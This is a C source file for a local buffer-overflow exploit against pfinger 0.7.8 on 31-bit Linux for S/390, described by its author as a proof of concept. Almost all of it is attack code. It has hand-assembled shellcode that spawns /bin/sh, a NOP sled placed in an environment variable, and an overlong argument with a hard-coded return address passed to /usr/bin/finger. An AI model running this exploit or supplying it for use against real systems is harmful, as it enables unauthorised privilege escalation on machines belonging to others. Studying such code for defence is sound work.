// linux390 (31bit) pfinger-0.7.8 <= local exploit
// 390 sploit by jcyberpunk@thehackerschoice.com
// diz is just a lame proof of concept sploit
// to show how easy 390linux exploitation is

#include <stdio.h>
#include <unistd.h>

char shellcode[]=
"\x0c\x10"              /* bassm        %r1,%r0                 */
"\x41\x90\x10\x48"      /* la           %r9,72(%r1)             */
"\xa7\xa8\xfb\xb4"      /* lhi          %r10,-1100              */
"\xa7\x68\x04\x56"      /* lhi          %r6,1110                */
"\x1a\x6a"              /* ar           %r6,%r10                */
"\x42\x60\x10\x48"      /* stc          %r6,72(%r1)             */
"\x17\x22"              /* xr           %r2,%r2                 */
"\x0d\xe9"              /* basr         %r14,%r9                */
"\xa7\x68\x04\x7a"      /* lhi          %r6,1146                */
"\x1a\x6a"              /* ar           %r6,%r10                */
"\x42\x60\x10\x49"      /* stc          %r6,73(%r1)             */
"\x0d\xe9"              /* basr         %r14,%r9                */
"\xa7\x68\x04\x57"      /* lhi          %r6,1111                */
"\x1a\x6a"              /* ar           %r6,%r10                */
"\x42\x60\x10\x49"      /* stc          %r6,73(%r1)             */
"\x41\x20\x10\x4c"      /* la           %r2,76(%r1)             */
"\x50\x20\x10\x54"      /* st           %r2,84(%r1)             */
"\x41\x30\x10\x54"      /* la           %r3,84(%r1)             */
"\x17\x44"              /* xr           %r4,%r4                 */
"\x42\x40\x10\x53"      /* stc          %r4,83(%r1)             */
"\x50\x40\x10\x58"      /* st           %r4,88(%r1)             */
"\x41\x40\x10\x58"      /* la           %r4,88(%r1)             */
"\x0d\xe9"              /* basr         %r14,%r9                */
"\x0b\x17"              /* svc n after self-modification        */
"\x07\xfe"              /* br           %r14                    */
"\x2f\x62"              /* /b                                   */
"\x69\x6e\x2f\x73"      /* in/s                                 */
"\x68\x5c";             /* h\                                   */

int main(void)
{
 unsigned int i;
 unsigned char buf[256],*b;
 unsigned char sc[256]; 
 unsigned char nop[]="\x17\x44";
 memset(buf,0,256);
 memset(buf,'x',160);
 b = sc;
 for(i=0;i<=100;i++) *b++ = nop[i%2];
 *(unsigned long *)(buf+160)=0x7fffff92; 
 memcpy(&sc[100-strlen(shellcode)],shellcode,strlen(shellcode)); 
 memcpy(sc,"evil=",5); 
 putenv(sc);
 execl("/usr/bin/finger", "finger", buf, NULL);
}
